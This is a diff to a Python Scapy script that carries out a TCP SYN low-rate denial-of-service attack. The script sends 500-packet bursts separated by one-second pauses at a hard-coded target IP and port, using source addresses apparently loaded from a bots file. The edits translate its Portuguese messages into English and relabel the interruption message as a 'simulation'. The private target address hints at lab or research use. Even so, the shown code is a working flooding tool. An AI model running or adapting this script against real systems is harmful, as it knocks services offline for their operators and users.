@@ -3,12 +3,13 @@ import random
 import time
 import ipaddress
 
+# TCP Low-Rate
 TARGET_IP = "192.168.100.2"
 TARGET_PORT = 50001
-BOTFILE = "bots.txt"
-PACKETS_PER_BURST = 500      # Quantos pacotes em cada burst
-BURST_DURATION = 1           # Duração de cada burst em segundos
-SILENCE_DURATION = 1         # Duração da pausa entre bursts
+BOTFILE = "../bots.txt"
+PACKETS_PER_BURST = 500
+BURST_DURATION = 1
+SILENCE_DURATION = 1
 
 def load_bots(filename):
     bot_ips = []
@@ -26,7 +27,7 @@ def run_tcp_lowrate_attack():
     total_packets = 0
     iface = "enp0s3"
 
-    print("Iniciando ataque TCP SYN Low Rate em bursts... Pressione Ctrl+C para interromper.")
+    print("TCP SYN Low Rate bursts... Press Ctrl+C to stop.")
 
     try:
         while True:
@@ -43,23 +44,22 @@ def run_tcp_lowrate_attack():
                 packet = eth_layer / ip_layer / tcp_layer
                 lista_de_pacotes.append(packet)
 
-            print(f"Enviando burst {burst_count} com {PACKETS_PER_BURST} pacotes...")
+            print(f"Sending burst {burst_count} with {PACKETS_PER_BURST} packets...")
             start_time = time.perf_counter()
             sendpfast(lista_de_pacotes, iface=iface, file_cache=True)
             end_time = time.perf_counter()
             duration = end_time - start_time
 
             total_packets += PACKETS_PER_BURST
-            print(f"Burst {burst_count} concluído. Duração do burst: {duration:.4f} segundos. Total enviado: {total_packets} pacotes.")
+            print(f"Burst {burst_count} ok. Burst total time: {duration:.4f} seconds. Total Packets: {total_packets}")
             
-            # Espera entre os bursts
-            print(f"Aguardando {SILENCE_DURATION} segundo(s) antes do próximo burst...")
+            # Time between bursts
+            print(f"Waiting {SILENCE_DURATION} seconds before the next burst.")
             time.sleep(SILENCE_DURATION)
     except KeyboardInterrupt:
-        print("\nAtaque interrompido pelo usuário.")
+        print("\nSimulation stopped.")
 
 if __name__ == "__main__":
-    print("e")
     run_tcp_lowrate_attack()
 
 # sudo PYTHONPATH=$HOME/scapy python3 tcp_low_rate.py
